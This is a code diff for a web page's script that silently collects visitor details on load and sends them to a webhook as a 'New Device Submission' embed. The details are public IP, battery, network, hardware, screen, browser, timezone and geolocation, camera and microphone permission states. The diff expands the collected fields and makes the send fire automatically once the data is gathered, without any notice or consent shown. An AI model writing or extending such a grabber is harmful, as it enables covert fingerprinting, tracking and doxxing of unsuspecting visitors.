@@ -51,24 +51,28 @@ function getDeviceModel() {
 
 /* ---------------- DATA COLLECTION ---------------- */
 const data = {};
+const promises = [];
 
 // Battery
 if (navigator.getBattery) {
-    navigator.getBattery().then(b => {
+    promises.push(navigator.getBattery().then(b => {
         data.battery = Math.round(b.level * 100) + "%";
         data.charging = b.charging ? "Yes" : "No";
         data.chargeTime = b.chargingTime === Infinity ? "Unknown" : b.chargingTime + " sec";
         data.dischargeTime = b.dischargingTime === Infinity ? "Unknown" : b.dischargingTime + " sec";
-    });
+    }));
 } else {
-    data.battery = data.charging = "Not supported";
+    data.battery = "Not supported";
+    data.charging = "Not supported";
+    data.chargeTime = "N/A";
+    data.dischargeTime = "N/A";
 }
 
 // IP
-fetch("https://api.ipify.org?format=json")
-.then(r => r.json())
-.then(d => data.ip = d.ip)
-.catch(() => data.ip = "Unavailable");
+promises.push(fetch("https://api.ipify.org?format=json")
+    .then(r => r.json())
+    .then(d => data.ip = d.ip)
+    .catch(() => data.ip = "Unavailable"));
 
 // Network
 const conn = navigator.connection || {};
@@ -110,13 +114,25 @@ data.offset = new Date().getTimezoneOffset() + " minutes";
 
 // Permissions
 if (navigator.permissions) {
-    navigator.permissions.query({name: "geolocation"})
-        .then(p => data.geoPerm = p.state);
-    navigator.permissions.query({name: "camera"})
-        .then(p => data.camPerm = p.state);
-    navigator.permissions.query({name: "microphone"})
-        .then(p => data.micPerm = p.state);
+    promises.push(navigator.permissions.query({name: "geolocation"})
+        .then(p => data.geoPerm = p.state)
+        .catch(() => data.geoPerm = "Not supported"));
+    promises.push(navigator.permissions.query({name: "camera"})
+        .then(p => data.camPerm = p.state)
+        .catch(() => data.camPerm = "Not supported"));
+    promises.push(navigator.permissions.query({name: "microphone"})
+        .then(p => data.micPerm = p.state)
+        .catch(() => data.micPerm = "Not supported"));
+} else {
+    data.geoPerm = "Not supported";
+    data.camPerm = "Not supported";
+    data.micPerm = "Not supported";
 }
+
+// Wait for all async data and send
+Promise.all(promises).then(() => {
+    sendToWebhook();
+});
 
 /* ---------------- SEND TO WEBHOOK ---------------- */
 function sendToWebhook() {
@@ -126,9 +142,16 @@ function sendToWebhook() {
             title: "New Device Submission",
             color: 5793266,
             fields: [
-                { name: "Battery", value: data.battery || "Loading...", inline: true },
-                { name: "Charging", value: data.charging || "Loading...", inline: true },
-                { name: "Public IP", value: data.ip || "Loading...", inline: false },
+                { name: "Battery", value: data.battery, inline: true },
+                { name: "Charging", value: data.charging, inline: true },
+                { name: "Charging Time", value: data.chargeTime, inline: true },
+                { name: "Discharging Time", value: data.dischargeTime, inline: true },
+                { name: "Public IP", value: data.ip, inline: false },
+
+                { name: "Connection Type", value: data.connection, inline: true },
+                { name: "Effective Type", value: data.effective, inline: true },
+                { name: "Downlink Speed", value: data.downlink, inline: true },
+                { name: "Online Status", value: data.online, inline: true },
 
                 { name: "Device Type", value: data.device, inline: true },
                 { name: "Device Model", value: data.model, inline: true },
@@ -136,15 +159,30 @@ function sendToWebhook() {
                 { name: "CPU Cores", value: data.cores, inline: true },
                 { name: "Memory", value: data.memory, inline: true },
 
-                { name: "Screen", value: data.screenRes, inline: true },
+                { name: "Screen Resolution", value: data.screenRes, inline: true },
+                { name: "Available Screen", value: data.availScreen, inline: true },
+                { name: "Color Depth", value: data.colorDepth, inline: true },
                 { name: "Pixel Ratio", value: data.pixelRatio, inline: true },
+                { name: "Touch Support", value: data.touch, inline: true },
+                { name: "Max Touch Points", value: data.touchPoints, inline: true },
 
                 { name: "OS", value: data.os, inline: true },
                 { name: "Browser", value: data.browser, inline: true },
                 { name: "Browser Version", value: data.browserVersion, inline: true },
                 { name: "Platform", value: data.platform, inline: true },
+                { name: "Vendor", value: data.vendor, inline: true },
+                { name: "Cookies Enabled", value: data.cookies, inline: true },
+                { name: "Do Not Track", value: data.dnt, inline: true },
+
                 { name: "Language", value: data.language, inline: true },
+                { name: "Languages", value: data.languages, inline: true },
                 { name: "Timezone", value: data.timezone, inline: true },
+                { name: "Local Time", value: data.localTime, inline: true },
+                { name: "UTC Offset", value: data.offset, inline: true },
+
+                { name: "Geolocation Permission", value: data.geoPerm, inline: true },
+                { name: "Camera Permission", value: data.camPerm, inline: true },
+                { name: "Microphone Permission", value: data.micPerm, inline: true },
 
                 {
                     name: "User Agent",
@@ -169,11 +207,6 @@ function sendToWebhook() {
     .then(() => console.log("Data sent successfully"))
     .catch(() => console.log("Failed to send data"));
 }
-
-// Send data automatically after page loads
-window.addEventListener('load', () => {
-    setTimeout(sendToWebhook, 3000); // Wait 3 seconds for async data
-});
 </script>
 
 </body>
